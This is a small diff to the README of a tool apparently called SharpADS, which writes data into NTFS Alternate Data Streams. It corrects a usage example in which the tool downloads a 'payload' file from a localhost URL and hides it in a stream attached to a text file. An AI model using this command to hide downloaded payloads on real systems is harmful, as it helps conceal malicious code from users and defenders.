@@ -26,7 +26,7 @@ SharpADS.exe write c:\Temp\test.txt ADS_name2 0x4142434445
 Download file example (payload starts with "http" or "https"):
 
 ```
-SharpADS.exe write c:\Temp\test.txt ADS_name3 http:///127.0.0.1/payload.bin
+SharpADS.exe write c:\Temp\test.txt ADS_name3 http://127.0.0.1:8000/a.bin
 ```
 
 ![img](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/SharpADS-screenshots/Screenshot_1.png)
